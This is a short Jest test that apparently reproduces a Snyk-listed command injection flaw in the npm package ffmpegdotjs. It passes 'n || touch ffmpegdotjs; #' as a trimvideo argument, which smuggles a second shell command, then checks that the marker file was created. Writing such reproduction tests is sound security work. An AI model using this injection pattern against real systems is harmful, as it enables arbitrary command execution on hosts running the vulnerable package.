//https://snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542
test("Command Injection in ffmpegdotjs", () => 
{
    var ffmpegdotjs = require("ffmpegdotjs");
	const fs = require('fs')
	const path = './ffmpegdotjs'
    const sleep = require('sleep');

    ffmpegdotjs.trimvideo("package-lock.json",0,30,"n || touch ffmpegdotjs; #");
    sleep.sleep(5);

	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});